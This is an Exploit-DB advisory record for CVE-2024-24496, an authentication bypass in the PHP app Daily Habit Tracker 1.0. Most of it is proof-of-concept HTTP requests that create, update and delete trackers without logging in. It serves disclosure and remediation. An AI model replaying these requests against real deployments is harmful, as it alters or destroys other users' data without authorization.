{"source": "https://www.exploit-db.com/exploits/51954", "vulnName": "Daily Habit Tracker 1.0 - Broken Access Control", "vulnEDBID": "51954", "vulnCVE": "2024-24496", "author": "YEVHENII BUTENKO", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Daily Habit Tracker 1.0 - Broken Access Control\n# Date: 2 Feb 2024\n# Exploit Author: Yevhenii Butenko\n# Vendor Homepage: https://www.sourcecodester.com\n# Software Link: https://www.sourcecodester.com/php/17118/daily-habit-tracker-using-php-and-mysql-source-code.html\n# Version: 1.0\n# Tested on: Debian\n# CVE : CVE-2024-24496\n\n### Broken Access Control:\n\n> Broken Access Control is a security vulnerability arising when a web application inadequately restricts user access to specific resources and functions. It involves ensuring users are authorized only for the resources and functionalities intended for them.\n\n### Affected Components:\n\n> home.php, add-tracker.php, delete-tracker.php, update-tracker.php\n\n### Description:\n\n> Broken access control enables unauthenticated attackers to access the home page and to create, update, or delete trackers without providing credentials.\n\n## Proof of Concept:\n\n### Unauthenticated Access to Home page\n\n> To bypass authentication, navigate to 'http://yourwebsitehere.com/home.php'. The application does not verify whether the user is authenticated or authorized to access this page.\n\n### Create Tracker as Unauthenticated User\n\nTo create a tracker, use the following request:\n\n```\nPOST /habit-tracker/endpoint/add-tracker.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 108\nOrigin: http://localhost\nDNT: 1\nConnection: close\nReferer: http://localhost/habit-tracker/home.php\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\ndate=1443-01-02&day=Monday&exercise=Yes&pray=Yes&read_book=Yes&vitamins=Yes&laundry=Yes&alcohol=Yes&meat=Yes\n```\n\n### Update Tracker as Unauthenticated User\n\nTo update a tracker, use the following request:\n\n```\nPOST /habit-tracker/endpoint/update-tracker.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 121\nOrigin: http://localhost\nDNT: 1\nConnection: close\nReferer: http://localhost/habit-tracker/home.php\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\ntbl_tracker_id=5&date=1443-01-02&day=Monday&exercise=No&pray=Yes&read_book=No&vitamins=Yes&laundry=No&alcohol=No&meat=Yes\n```\n\n### Delete Tracker as Unauthenticated User:\n\nTo delete a tracker, use the following request:\n\n```\nGET /habit-tracker/endpoint/delete-tracker.php?tracker=5 HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nDNT: 1\nConnection: close\nReferer: http://localhost/habit-tracker/home.php\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n```\n\n## Recommendations\n\nWhen using this tracking system, it is essential to update the application code to ensure that proper access controls are in place.\n            "}